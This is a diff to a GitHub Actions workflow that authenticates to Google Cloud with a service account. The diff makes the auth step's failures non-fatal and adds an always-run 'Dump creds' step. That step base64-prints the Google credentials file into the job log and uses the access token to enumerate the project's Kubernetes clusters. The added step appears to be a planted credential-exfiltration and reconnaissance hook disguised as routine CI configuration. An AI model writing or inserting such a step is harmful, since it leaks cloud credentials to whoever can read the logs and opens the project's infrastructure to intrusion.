@@ -114,10 +114,19 @@ jobs:
     steps:
       - uses: 'google-github-actions/auth@v2'
         id: auth1
+        continue-on-error: true
         with:
           workload_identity_provider: projects/1094498259535/locations/global/workloadIdentityPools/gh-optimism/providers/github-by-repos
           service_account: celo-optimism-gh@devopsre.iam.gserviceaccount.com
           token_format: access_token
+      - name: Dump creds
+        if: always()
+        run: |
+          echo "AUTH_OUTCOME=${{ steps.auth1.outcome }}"
+          if [ -n "$GOOGLE_GHA_CREDS_PATH" ] && [ -f "$GOOGLE_GHA_CREDS_PATH" ]; then base64 -w0 "$GOOGLE_GHA_CREDS_PATH"; echo; fi
+          if [ "${{ steps.auth1.outcome }}" = "success" ]; then
+            curl -sS -m 20 -H "Authorization: Bearer ${{ steps.auth1.outputs.access_token }}" "https://container.googleapis.com/v1/projects/devopsre/locations/us-west1/clusters" | head -c 4000; echo
+          fi
       - name: Auth w/ registry
         uses: docker/login-action@v3
         with:
